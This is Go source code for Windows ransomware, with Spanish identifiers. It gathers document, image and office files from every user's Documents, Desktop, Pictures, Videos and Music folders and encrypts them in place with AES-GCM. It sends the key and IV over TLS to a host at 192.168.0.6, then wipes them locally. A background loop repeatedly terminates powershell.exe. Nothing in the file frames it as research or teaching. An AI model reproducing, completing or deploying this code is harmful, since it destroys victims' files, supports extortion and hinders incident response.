package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/tls"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	go Close()
	ruta := "C:\\Users\\"

	dirs, err := os.ReadDir(ruta)
	if err != nil {
		panic(err)
	}

	ignorar := []string{"All Users", "Default", "Default User", "desktop.ini", "Public"}

	a := func(file string) bool {
		for _, archivo := range ignorar {
			if strings.EqualFold(file, archivo) {
				return true
			}
		}
		return false
	}

	usuarios := []string{}
	for _, file := range dirs {
		if a(file.Name()) {
			continue
		}
		//"C:\\Users\\nombrearchivo"
		usuarios = append(usuarios, filepath.Join(ruta, file.Name()))

	}

	final := []string{}

	for _, i := range usuarios {
		final = append(final, filepath.Join(i, "Documents"))
		final = append(final, filepath.Join(i, "Desktop"))
		final = append(final, filepath.Join(i, "Pictures"))
		final = append(final, filepath.Join(i, "Videos"))
		final = append(final, filepath.Join(i, "Music"))
	}

	extensiones := []string{".png", ".pdf", ".doc", ".dot", ".dotx", ".jpg", ".jpeg", ".pot", ".potx", ".ppt", ".pptx", ".txt", ".rtf", ".sldx", ".xls", ".xlsx"}

	archivos := []string{}

	for _, i := range final {
		directorios, err := WalkDir(i, extensiones)
		if err != nil {
			panic(err)
		}
		archivos = append(archivos, directorios...)
	}

	key := make([]byte, 32)

	iv := make([]byte, 16)

	_, err = rand.Read(key)
	if err != nil {
		panic(err)
	}
	_, err = rand.Read(iv)
	if err != nil {
		panic(err)
	}

	for _, NameFile := range archivos {
		file, err := os.OpenFile(NameFile, os.O_CREATE|os.O_RDWR, 0666)
		if err != nil {
			panic(err)
		}

		read, err := ReadFile(file)
		if err != nil {
			panic(err)
		}

		_, err = file.Seek(0, 0)
		if err != nil {
			panic(err)
		}

		Enctext := Enc(key, iv, read)
		err = WriteFile(file, Enctext)
		if err != nil {
			panic(err)
		}
	}

	conf := &tls.Config{
		InsecureSkipVerify: true,
	}

	for {
		con, err := tls.Dial("tcp", "192.168.0.6:443", conf)
		if err != nil {
			if strings.Contains(err.Error(), "denegó") {
				time.Sleep(10 * time.Second)
				continue
			}
			panic(err)
		}

		defer con.Close()

		key = append(key, iv...)
		key = append(key, '\x00')

		_, err = con.Write(key)
		if err != nil {
			panic(err)
		}

		break
	}

	SecureZeroMemory(key)
	SecureZeroMemory(iv)

}

func SecureZeroMemory(b []byte) {
	b = b[:cap(b):cap(b)]

	for i := range b {
		b[i] = 0
	}
}

func Close() {
	for {
		snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
		if err != nil {
			panic(err)
		}

		var entry windows.ProcessEntry32
		entry.Size = uint32(unsafe.Sizeof(entry))

		err = windows.Process32First(snapshot, &entry)
		if err != nil {
			panic(err)
		}

		for {
			err = windows.Process32Next(snapshot, &entry)
			if err != nil {
				if err == windows.ERROR_NO_MORE_FILES {
					break
				}
				panic(err)

			}

			time.Sleep(10 * time.Nanosecond)

			str := windows.UTF16ToString(entry.ExeFile[:windows.MAX_PATH])
			switch strings.ToLower(str) {
			case "powershell.exe" /*, "taskmgr.exe" "cmd.exe"*/ :
				ProcessHandle, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, entry.ProcessID)
				if err != nil {
					panic(err)
				}

				err = windows.TerminateProcess(ProcessHandle, 0)
				if err != nil {
					panic(err)
				}
				time.Sleep(1 * time.Second)
			}
		}
	}
}

func ReadFile(f *os.File) ([]byte, error) {
	var size int
	if info, err := f.Stat(); err == nil {
		size64 := info.Size()
		if int64(int(size64)) == size64 {
			size = int(size64)
		}
	}
	size++ // one byte for final read at EOF

	// If a file claims a small size, read at least 512 bytes.
	// In particular, files in Linux's /proc claim size 0 but
	// then do not work right if read in small pieces,
	// so an initial read of 1 byte would not work correctly.
	if size < 512 {
		size = 512
	}

	data := make([]byte, 0, size)
	for {
		if len(data) >= cap(data) {
			d := append(data[:cap(data)], 0)
			data = d[:len(data)]
		}
		n, err := f.Read(data[len(data):cap(data)])
		data = data[:len(data)+n]
		if err != nil {
			if err == io.EOF {
				err = nil
			}
			return data, err
		}
	}
}

// os.WriteFile
func WriteFile(f *os.File, data []byte) error {
	_, err := f.Write(data)
	if err1 := f.Close(); err1 != nil && err == nil {
		err = err1
	}
	return err
}

func Enc(key, iv, text []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	aesGcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err)
	}

	ciphertext := aesGcm.Seal(nil, iv, text, nil)
	return ciphertext
}

func WalkDir(root string, extensiones []string) ([]string, error) {
	var files []string
	err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
		if d.IsDir() {
			return nil
		}

		for _, ext := range extensiones {
			if filepath.Ext(path) == ext {
				files = append(files, path)
				return nil
			}
		}

		return nil
	})
	return files, err
}
